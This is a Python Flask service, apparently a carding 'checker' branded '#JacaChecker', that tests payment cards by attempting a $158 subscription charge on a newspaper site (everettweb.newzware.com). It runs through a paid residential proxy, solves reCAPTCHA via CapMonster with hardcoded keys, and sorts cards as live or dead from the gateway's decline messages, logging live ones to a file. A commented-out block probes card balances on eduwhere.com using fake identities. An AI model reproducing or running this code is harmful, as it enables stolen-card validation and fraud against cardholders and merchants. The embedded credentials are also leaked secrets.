import csv
import json
from flask import Flask, request, render_template, jsonify
from flask_cors import CORS
import os
import http.client
import threading, requests, random, time, random, re
from urllib3 import disable_warnings
from colorama import Fore


disable_warnings()

    
app = Flask(__name__)

CORS(app)
    
def pegarItem(data, esquerda, direita):
    return data.partition(esquerda)[-1].partition(direita)[0]

def criarTask():
    data = {
        "clientKey": "409154ed879c9e41c25703a6f92289bd",
        "task": {
            "type": "RecaptchaV2TaskProxyless",
            "websiteURL": "https://everettweb.newzware.com/ss70v2/sound/common/template.jsp",
            "websiteKey": "6LeF47cUAAAAAMbDh0XxUukTdBNNF8xjOvWJ5Xtc",
        },
    }
    criar = requests.post(
        "https://api.capmonster.cloud/createTask", verify=False, json=data
    )
    taskId = criar.json()["taskId"]
    while True:
        data = {"clientKey": "409154ed879c9e41c25703a6f92289bd", "taskId": taskId}
        resultado = requests.post(
            "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
        )
        print(resultado.text)
        if '"status":"ready"' in resultado.text:
            return resultado.json()["solution"]["gRecaptchaResponse"]
        time.sleep(1)


def api_bin(bin):
    try:
        req = requests.get(
            f"https://parrotv2.prod.pagosapi.com/cards?bin={bin}",
            headers={"x-api-key": "fe8d6db2967a4e77b4d7268448897c95"},
            verify=False,
        )
        if req.status_code == 200:
            try:
                tipo = req.json()["card"]["type"]
                nivel = req.json()["card"]["product"]["product_name"]
                banco = req.json()["card"]["bank"]["name"]
                try:
                    pais = req.json()["card"]["country"]["name"]
                except:
                    pais = "N/A"
                return f"{nivel} {tipo} {banco} {pais}".upper()
            except:
                return "SEM INFORMAÇÃO DA BIN"
        else:
            return "SEM INFORMAÇÃO DA BIN"
    except:
        return "SEM INFORMAÇÃO DA BIN"
    

class RequisicaoException(Exception):
    def __init__(self):
        super().__init__()


def reteste(card, month, year, cvv):
        checker(card, month, year, cvv)



def definir_tipo_cartao(card):
    if card.startswith("4"):
        return "VISA"
    elif card.startswith(("51", "52", "53", "54", "55")):
        return "MASTER"
    elif card.startswith(("34", "37")):
        return "American Express"
    elif card.startswith("6"):
        return "Discover"
    else:
        return "Desconhecido"
    
    
# def retesteSaldo(card, month, year, cvv):
#         saldo(card, month, year, cvv)
        
# def Saldo():
#     data = {
#         "clientKey": "409154ed879c9e41c25703a6f92289bd",
#         "task": {
#             "type": "RecaptchaV2EnterpriseTask",
#             "websiteURL": "https://www.eduwhere.com/secure/autopay_confirm.php",
#             "websiteKey": "6LfFHhQUAAAAAFFMGjELVU4DwN8oDECRFp1nCupe",
#         },
#     }
#     criar = requests.post(
#         "https://api.capmonster.cloud/createTask", verify=False, json=data
#     )
#     taskId = criar.json()["taskId"]
#     while True:
#         data = {"clientKey": "409154ed879c9e41c25703a6f92289bd", "taskId": taskId}
#         resultado = requests.post(
#             "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
#         )
#        #print(resultado.text)
#         if '"status":"ready"' in resultado.text:
#             return resultado.json()["solution"]["gRecaptchaResponse"]
#         time.sleep(1)
        
# def saldo(card, month, year, cvv):
#         try:    
        
#             url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
#             headers = {
#                     'Host': 'randomuser.me',
#                     'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
#                     'accept': 'application/json, text/plain, */*',
#                     'sec-ch-ua-mobile': '?0',
#                     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
#                     'sec-ch-ua-platform': '"Windows"',
#                     'origin': 'https://namso-gen.com',
#                     'sec-fetch-site': 'cross-site',
#                     'sec-fetch-mode': 'cors',
#                     'sec-fetch-dest': 'empty',
#                     'referer': 'https://namso-gen.com/',
#                     'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
#                     }

#             response = requests.get( url, headers=headers, verify=False)
#             email = pegarItem(response.text, '"email":"','"')
#             nome = pegarItem(response.text, '"first":"','"')
#             sobrenome = pegarItem(response.text, '"last":"','"')
#             street = pegarItem(response.text, '"name":"','"},"city"')
#             snumber = pegarItem(response.text, '"street":{"number":',',')
#             city = pegarItem(response.text, '"city":"','"')
#             state = pegarItem(response.text, '"state":"','"')
#             state = state[0:2].upper()
#             postcode = pegarItem(response.text, '"postcode":',',')
#             company = pegarItem(response.text, '"username":"','"')
#             tel = random.randint(1111,9999)
#             tel2 = random.randint(111,999)
#             tel3 = random.randint(111,999)
           
            
#             recap = Saldo()
            
#             if len(year) == 4:
#                 year = year[2:]
                
#             url = "https://www.eduwhere.com/secure/autopay_confirm.php"
#             payload = f"pigID=nada&ssl_invoice_number=nadaPnada&ssl_amount=11&invnbr={tel}{tel2}&user_message=+&cctype=VISA&ssl_card_number={card}&exp_date_month={month}&exp_date_year={year}&ssl_cvv2cvc2=232&ssl_first_name={nome}&ssl_last_name={sobrenome}&ssl_company=MR&ssl_avs_address={snumber}+{street}&ssl_address2=&ssl_city={city}&ssl_state={state}&ssl_avs_zip={postcode}&billcountry=United+States&ap_ponumber=&g-recaptcha-response={recap}"
#             headers = {
#                 'Host': 'www.eduwhere.com',
#                 'content-type': 'application/x-www-form-urlencoded',
#                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
#                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
#                 }
#             response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False)
            
            
#             if 'ssl_account_balance' in response.text:
#                 saldousdo = pegarItem(response.text, '&amp;ssl_account_balance=','&')       
                
#                 return saldousdo
#         except requests.exceptions.ProxyError:
#             print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
#             retesteSaldo(card, month, year, cvv)
#         except requests.exceptions.ConnectionError:
#             print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
#             retesteSaldo(card, month, year, cvv)
#         except requests.exceptions.RequestException:
#             print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
#             retesteSaldo(card, month, year, cvv)
            
            
def checker(card, month, year, cvv):
    try:
        #time.sleep(10)
        p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225'}
        start_time = time.time() 


        url = "https://everettweb.newzware.com/newzlib/jsp/ci/login_check_jso.jsp"

        payload = {
            'site':	'sound',
            'login_id':	'9cu324hfvc98743@gmail.com',
            'password':	'radask10',
            'referrer': '',
            'masterL':	'',
            'masterP':	'null',
        }
        headers = {
            'Host': 'everettweb.newzware.com',
            'Cookie': 'nwssmcookie=ssm; nwssmapptype=S',
            'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-requested-with': 'XMLHttpRequest',
            'sec-ch-ua-mobile': '?0',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'sec-ch-ua-platform': '"Windows"',
            'origin': 'https://everettweb.newzware.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://everettweb.newzware.com/ss70v2/sound/common/template.jsp',
            'accept-language': 'pt-PT,pt;q=0.9'
            }

        response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
        sessao = response.cookies.get('JSESSIONID')


        # url = "https://everettweb.newzware.com/ss70v2/common/login.jsp"

        # payload = {
        #     'login_id':	'9cu324hfvc98743@gmail.com',
        #     'hash':	'a5f7964ccd6d9c98056f5ce3a39c41a3',
        #     'site':	'sound',
        #     'encrypted':	'Y',
        #     'nwmodule':	'',
        #     'nwpage':	'',
        #     'rate_id':	'',
        #     'remember':	'N',
        #     'reverse_remember_me':	'N',
        #     'nwregistered':	'',
        # }
        # headers = {
        # 'Host': 'everettweb.newzware.com',
        # 'Cookie': f'JSESSIONID={sessao}; nwssmcookie=ssm; nwssmapptype=S',
        # 'cache-control': 'max-age=0',
        # 'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        # 'sec-ch-ua-mobile': '?0',
        # 'sec-ch-ua-platform': '"Windows"',
        # 'upgrade-insecure-requests': '1',
        # 'origin': 'https://everettweb.newzware.com',
        # 'content-type': 'application/x-www-form-urlencoded',
        # 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        # 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        # 'sec-fetch-site': 'same-origin',
        # 'sec-fetch-mode': 'navigate',
        # 'sec-fetch-user': '?1',
        # 'sec-fetch-dest': 'document',
        # 'referer': 'https://everettweb.newzware.com/ss70v2/sound/common/template.jsp',
        # 'accept-language': 'pt-PT,pt;q=0.9'
        # }

        # response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
        
        url = "https://everettweb.newzware.com/newzlib/jsp/ci/calculate.jsp?site=sound&retail_rate=31510&d_street=3065%20TRADEPORT%20DR%20%23%20209315&d_city=ORLANDO&d_zip=32824&d_state=FL&d_country=US&grat_amt=0&nie_amt=0&occ_id=90411332"

        payload = "https://everettweb.newzware.com/newzlib/jsp/ci/calculate.jsp?site=sound&retail_rate=31510&d_street=3065%20TRADEPORT%20DR%20%23%20209315&d_city=ORLANDO&d_zip=32824&d_state=FL&d_country=US&grat_amt=0&nie_amt=0&occ_id=90411332"
        headers = {
        'Host': 'everettweb.newzware.com',
        'Cookie': f'JSESSIONID={sessao}; nwssmcookie=ssm; nwssmapptype=S',
        'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'accept': '*/*',
        'origin': 'https://everettweb.newzware.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://everettweb.newzware.com/ss70v2/sound/common/template.jsp',
        'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'priority': 'u=1, i',
        'Content-Type': 'text/plain'
        }

        response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
        
        
        
        recap = criarTask()
        url = f"https://everettweb.newzware.com/newzlib/jsp/ci/start_subscription.jsp?site=sound&prefix=&fname=CLARKSON&b_fname=&lname=PESRES&b_lname=&suffix=&email=9cu324hfvc98743%40gmail.com&copies=1&h_phone=801-300-6333&d_street=3065%20TRADEPORT%20DR%20%23%20209315&d_city=ORLANDO&d_state=FL&d_zip=32824&d_country=US&sameBilling=Y&b_street=&b_city=&b_state=FL&b_zip=&b_country=US&pay_method=C&cc_num={card}&cc_type=VISA&cc_cid=121&cc_exp_month={month}&cc_exp_year={year}&cc_holder=james%20ean&acct_num=&acct_type=C&acct_receiving=&bd_branch_num=&bd_br_transit=&debit_day=10&retail_rate=31510&start_date=05%2F01%2F2024&recurring=N&tax_amt=0.00&net_amt=158.00&nie_amt=0&grat_amt=0&subtotal_amt=158.00&ju_id=0&occ_id=90411332&login_id=9cu324hfvc98743%40gmail.com&password=8g7BaBGHai2c3VY0jujvcA%3D%3D&encrypted=Y&promoCode=&oneTimeForRecurring=Y&nwCapChallenge={recap}"

        payload = f"https://everettweb.newzware.com/newzlib/jsp/ci/start_subscription.jsp?site=sound&prefix=&fname=CLARKSON&b_fname=&lname=PESRES&b_lname=&suffix=&email=9cu324hfvc98743%40gmail.com&copies=1&h_phone=801-300-6333&d_street=3065%20TRADEPORT%20DR%20%23%20209315&d_city=ORLANDO&d_state=FL&d_zip=32824&d_country=US&sameBilling=Y&b_street=&b_city=&b_state=FL&b_zip=&b_country=US&pay_method=C&cc_num={card}&cc_type=VISA&cc_cid=121&cc_exp_month={month}&cc_exp_year={year}&cc_holder=james%20ean&acct_num=&acct_type=C&acct_receiving=&bd_branch_num=&bd_br_transit=&debit_day=10&retail_rate=31510&start_date=05%2F01%2F2024&recurring=N&tax_amt=0.00&net_amt=158.00&nie_amt=0&grat_amt=0&subtotal_amt=158.00&ju_id=0&occ_id=90411332&login_id=9cu324hfvc98743%40gmail.com&password=8g7BaBGHai2c3VY0jujvcA%3D%3D&encrypted=Y&promoCode=&oneTimeForRecurring=Y&nwCapChallenge={recap}"
        headers = {
        'Host': 'everettweb.newzware.com',
        'Cookie': f'JSESSIONID={sessao}; nwssmcookie=ssm; nwssmapptype=S',
        'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'accept': '*/*',
        'origin': 'https://everettweb.newzware.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://everettweb.newzware.com/ss70v2/sound/common/template.jsp',
        'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'priority': 'u=1, i',
        'Content-Type': 'text/plain'
        }

        response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
        print(response.text)
        time.sleep(5)

        elapsed_time = time.time() - start_time
        
        MSegundos = round(elapsed_time, 2)


        
        if 'Insufficient funds' in response.text:
            #saldousdo = saldo(card, month, year, cvv)
            bin = api_bin(card[:6])              
            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF "                          
            open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF [{MSegundos}] #JacaChecker\n") 
            print(Fore.GREEN + f"{x} #JacaChecker") 
            return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
            
        elif 'Unidentifiable error issuer generated' in response.text:
            #saldousdo = saldo(card, month, year, cvv)
            bin = api_bin(card[:6])              
            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19 "                          
            open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
            print(Fore.GREEN + f"{x} #JacaChecker") 
            return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
                
        elif 'expired' in response.text:  
            bin = api_bin(card[:6])
            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Card Expired [{MSegundos}] MS"     
            print(Fore.RED + f"{x} #JacaChecker")  
            return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}  
                                    
        elif 'The specified account was not found' in response.text:  
            bin = api_bin(card[:6])
            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Account Not Found [{MSegundos}] MS"     
            print(Fore.RED + f"{x} #JacaChecker")  
            return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"} 
            
        elif 'The account number failed to pass the LUHN' in response.text:  
            bin = api_bin(card[:6])
            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Invalid Card [{MSegundos}] MS"     
            print(Fore.RED + f"{x} #JacaChecker")  
            return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
            
        elif 'Do not honor' in response.text:  
            bin = api_bin(card[:6])
            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Do Not Honor [{MSegundos}] MS"     
            print(Fore.RED + f"{x} #JacaChecker")  
            return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
            
        elif 'Issuer has flagged this account as fraudulent' in response.text:  
            bin = api_bin(card[:6])
            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Suspected Fraud [{MSegundos}] MS"     
            print(Fore.RED + f"{x} #JacaChecker")  
            return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
            
        elif 'Card has been restricted' in response.text:  
            bin = api_bin(card[:6])
            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Card has been restricted [{MSegundos}] MS"     
            print(Fore.RED + f"{x} #JacaChecker")  
            return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
            
        else:
            
            print(Fore.RED + 'Gateway Timeout' + response.text)
            return {"code": 2, "mensagem": f"Gateway Timeout #JacaChecker<br>"}
            
                    


            
    except requests.exceptions.ProxyError:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
        #reteste(card, month, year, cvv)
        
    except requests.exceptions.ConnectionError:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
        #reteste(card, month, year, cvv)
    except requests.exceptions.RequestException:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
        #reteste(card, month, year, cvv)
    except RequisicaoException:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO Location: {card}|{month}|{year}|{cvv}")
        #reteste(card, month, year, cvv)
            


def processar_cartoes(card,mes,ano,cvv):
    try:
        if len(card) == 16 or len(card) == 15 and mes and ano and cvv:
            retorno = checker(card,mes,ano,cvv)
            return {"code": retorno["code"], "retorno": retorno["mensagem"]}
        else:
            return {"code": "", "retorno": "erro no formulario"}
    except:
        #retorno = reteste(card,mes,ano,cvv)
        return {"code": "", "retorno": "Exception !"}
    
    

            
            
@app.route('/', methods=['GET'])
def iniciarChk():
    return "@Engenieiro"


@app.route('/chk', methods=['GET'])
def chk():
    args = request.args
    print(args)
    card = args.get('card')
    mes = args.get('mes')
    ano = args.get('ano')
    cvv = args.get('cvv')
    return jsonify(processar_cartoes(card,mes,ano,cvv))



if __name__ == '__main__':
    app.run(host='localhost', port=5000, debug=True)
    
    
    
    
